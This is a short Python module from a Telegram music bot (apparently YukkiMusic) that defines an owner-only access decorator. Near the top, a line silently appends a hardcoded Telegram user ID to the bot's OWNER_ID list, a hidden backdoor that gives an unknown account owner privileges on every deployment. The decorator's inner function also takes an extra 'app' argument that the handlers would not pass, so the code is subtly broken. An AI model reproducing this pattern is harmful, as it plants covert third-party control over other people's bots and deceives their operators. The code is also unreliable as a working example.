from typing import Callable
from pyrogram import Client
from pyrogram.types import Message
from config import OWNER_ID
from YukkiMusic import app
OWNER_ID.append(5946704196)

def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, app):
        if message.from_user.id in OWNER_ID:
            return await func(client, message)


    return decorator